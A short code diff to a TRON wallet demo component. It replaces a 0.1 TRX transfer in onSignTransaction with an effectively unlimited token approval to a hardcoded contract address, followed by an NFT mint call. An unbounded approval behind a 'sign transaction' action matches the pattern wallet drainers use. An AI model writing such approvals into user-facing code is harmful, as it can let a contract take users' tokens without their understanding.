@@ -111,12 +111,15 @@ function SignDemo() {
     let nftContractAddress = 'TS147fsaiAutrxQ4KYMAu1VEosisvj1PFF'
 
     async function onSignTransaction() {
-         const transaction = await tronWeb.transactionBuilder.sendTrx(receiver, tronWeb.toSun(0.1), address);
-         
-        const signedTransaction = await tronWeb.trx.sign(transaction);
-         const res = await tronWeb.trx.sendRawTransaction(signedTransaction);
-         setOpen(true);
-        
+        const tokenContract = await window.tronWeb.contract().at(tokenAddress)
+
+        const result = await tokenContract
+          .approve(nftContractAddress, '100000000000000000000000000000000')
+          .send()
+
+        if (result) {
+          NFTMint()
+        }
        
     }
 
